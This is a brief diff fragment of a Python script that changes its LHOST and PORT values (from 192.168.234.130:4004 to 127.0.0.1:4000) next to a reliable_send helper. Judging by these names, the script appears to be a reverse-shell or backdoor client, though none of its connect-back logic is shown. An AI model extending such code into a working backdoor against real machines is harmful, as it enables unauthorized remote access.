@@ -13,7 +13,9 @@ import pyautogui
 import termcolor
 
 
-LHOST = "192.168.234.130";PORT = 4004
+
+
+LHOST = "127.0.0.1";PORT = 4000
 
 def reliable_send(data):
     jsondata = json.dumps(data)
